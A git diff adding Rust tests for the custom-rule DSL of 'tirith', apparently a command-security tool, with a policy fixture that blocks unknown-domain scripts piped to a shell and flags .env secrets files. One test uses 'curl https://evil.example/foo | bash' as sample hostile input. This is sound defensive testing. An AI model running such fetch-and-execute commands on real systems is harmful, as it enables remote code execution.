@@ -12921,3 +12921,255 @@ fn browser_host_persist_failure_acks_false_and_keeps_serving() {
         "no record should be persisted when the state dir cannot be created"
     );
 }
+
+// ---------------------------------------------------------------------------
+// M13 ch4 — `tirith rule test|validate|explain` (custom-rule DSL CLI).
+// ---------------------------------------------------------------------------
+
+/// The shipping 7-rule DSL fixture, inlined so these tests are hermetic.
+const RULE_DSL_POLICY: &str = r#"custom_rules:
+  - id: block-unknown-curl-to-shell
+    when:
+      all:
+        - command.has_pipeline_to: [sh, bash, zsh]
+        - url.reputation: unknown
+        - url.domain_not_in: [company.com, github.com]
+    action: block
+    severity: critical
+    message: "Unknown-domain script piped to shell"
+    context: [exec]
+  - id: warn-plain-http-offsite
+    when:
+      all:
+        - url.scheme: http
+        - not:
+            url.host_matches: '(^|\.)company\.com$'
+    severity: medium
+    title: "Plain-HTTP request to an off-site host"
+    context: [exec, paste]
+  - id: flag-env-file-scan
+    when:
+      file.path_matches: '(^|/)\.env(\.|$)'
+    severity: low
+    title: "Scanned a .env-style secrets file"
+    context: [file]
+"#;
+
+/// Create a temp project (cwd) with `.tirith/policy.yaml` + `.git`, returning
+/// the TempDir (keep it alive) and the project dir to run `rule` commands from.
+fn rule_project(policy_yaml: &str) -> (tempfile::TempDir, PathBuf) {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let proj = tmp.path().join("project");
+    fs::create_dir_all(proj.join(".tirith")).unwrap();
+    fs::create_dir_all(proj.join(".git")).unwrap();
+    fs::write(proj.join(".tirith").join("policy.yaml"), policy_yaml).unwrap();
+    (tmp, proj)
+}
+
+#[test]
+fn rule_validate_shipping_policy_exits_zero() {
+    let (_tmp, proj) = rule_project(RULE_DSL_POLICY);
+    let out = tirith()
+        .args(["rule", "validate"])
+        .current_dir(&proj)
+        .output()
+        .expect("run tirith");
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "valid DSL policy should exit 0; stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+}
+
+#[test]
+fn rule_test_acceptance_fires() {
+    let (_tmp, proj) = rule_project(RULE_DSL_POLICY);
+    let out = tirith()
+        .args([
+            "rule",
+            "test",
+            "--rule",
+            "block-unknown-curl-to-shell",
+            "--input",
+            "curl https://evil.example/foo | bash",
+            "--json",
+        ])
+        .current_dir(&proj)
+        .output()
+        .expect("run tirith");
+    assert_eq!(out.status.code(), Some(0));
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
+    assert_eq!(
+        v["fires"],
+        serde_json::json!(true),
+        "acceptance rule must fire"
+    );
+    assert_eq!(v["kind"], serde_json::json!("when"));
+}
+
+#[test]
+fn rule_test_allowlisted_domain_does_not_fire() {
+    let (_tmp, proj) = rule_project(RULE_DSL_POLICY);
+    let out = tirith()
+        .args([
+            "rule",
+            "test",
+            "--rule",
+            "block-unknown-curl-to-shell",
+            "--input",
+            "curl https://github.com/foo | bash",
+            "--json",
+        ])
+        .current_dir(&proj)
+        .output()
+        .expect("run tirith");
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
+    assert_eq!(
+        v["fires"],
+        serde_json::json!(false),
+        "github.com is allowlisted, rule must not fire"
+    );
+}
+
+#[test]
+fn rule_test_unknown_rule_exits_one() {
+    let (_tmp, proj) = rule_project(RULE_DSL_POLICY);
+    let out = tirith()
+        .args(["rule", "test", "--rule", "no-such-rule", "--input", "ls"])
+        .current_dir(&proj)
+        .output()
+        .expect("run tirith");
+    assert_eq!(out.status.code(), Some(1), "unknown rule id should exit 1");
+}
+
+#[test]
+fn rule_validate_context_mismatch_exits_one() {
+    // A command.* predicate declared under `paste` context: predicates can
+    // never see exec data, so validate must reject it.
+    let policy = r#"custom_rules:
+  - id: bad-ctx
+    when:
+      command.uses_sudo: true
+    severity: high
+    title: "bad context"
+    context: [paste]
+"#;
+    let (_tmp, proj) = rule_project(policy);
+    let out = tirith()
+        .args(["rule", "validate"])
+        .current_dir(&proj)
+        .output()
+        .expect("run tirith");
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "context-mismatch rule should exit 1"
+    );
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("bad-ctx") && stderr.contains("context"),
+        "error should name the rule + context issue; got: {stderr}"
+    );
+}
+
+#[test]
+fn rule_validate_malformed_when_exits_one() {
+    let policy = r#"custom_rules:
+  - id: bad-predicate
+    when:
+      command.not_a_real_predicate: true
+    severity: high
+    title: "bad"
+    context: [exec]
+"#;
+    let (_tmp, proj) = rule_project(policy);
+    let out = tirith()
+        .args(["rule", "validate"])
+        .current_dir(&proj)
+        .output()
+        .expect("run tirith");
+    assert_eq!(out.status.code(), Some(1), "malformed when should exit 1");
+}
+
+#[test]
+fn rule_validate_both_pattern_and_when_exits_one() {
+    let policy = r#"custom_rules:
+  - id: both
+    pattern: "foo"
+    when:
+      command.uses_sudo: true
+    severity: high
+    title: "both"
+    context: [exec]
+"#;
+    let (_tmp, proj) = rule_project(policy);
+    let out = tirith()
+        .args(["rule", "validate"])
+        .current_dir(&proj)
+        .output()
+        .expect("run tirith");
+    assert_eq!(out.status.code(), Some(1), "pattern+when should exit 1");
+}
+
+#[test]
+fn rule_explain_prints_predicate_tree() {
+    let (_tmp, proj) = rule_project(RULE_DSL_POLICY);
+    let out = tirith()
+        .args(["rule", "explain", "--rule", "block-unknown-curl-to-shell"])
+        .current_dir(&proj)
+        .output()
+        .expect("run tirith");
+    assert_eq!(out.status.code(), Some(0));
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    assert!(stdout.contains("CRITICAL"), "explain should show severity");
+    assert!(
+        stdout.contains("all:"),
+        "explain should show the predicate tree"
+    );
+    assert!(
+        stdout.contains("command.has_pipeline_to"),
+        "explain should show leaf predicates; got: {stdout}"
+    );
+}
+
+#[test]
+fn rule_explain_json_has_when_tree() {
+    let (_tmp, proj) = rule_project(RULE_DSL_POLICY);
+    let out = tirith()
+        .args([
+            "rule",
+            "explain",
+            "--rule",
+            "block-unknown-curl-to-shell",
+            "--json",
+        ])
+        .current_dir(&proj)
+        .output()
+        .expect("run tirith");
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
+    assert_eq!(v["kind"], serde_json::json!("when"));
+    assert_eq!(v["effective_action"], serde_json::json!("block"));
+    assert!(v["when"]["all"].is_array(), "when tree should serialize");
+}
+
+#[test]
+fn rule_test_file_path_predicate_fires() {
+    let (_tmp, proj) = rule_project(RULE_DSL_POLICY);
+    let out = tirith()
+        .args([
+            "rule",
+            "test",
+            "--rule",
+            "flag-env-file-scan",
+            "--input",
+            "config/.env",
+            "--json",
+        ])
+        .current_dir(&proj)
+        .output()
+        .expect("run tirith");
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
+    assert_eq!(v["context"], serde_json::json!("file"));
+    assert_eq!(v["fires"], serde_json::json!(true), ".env path should fire");
+}
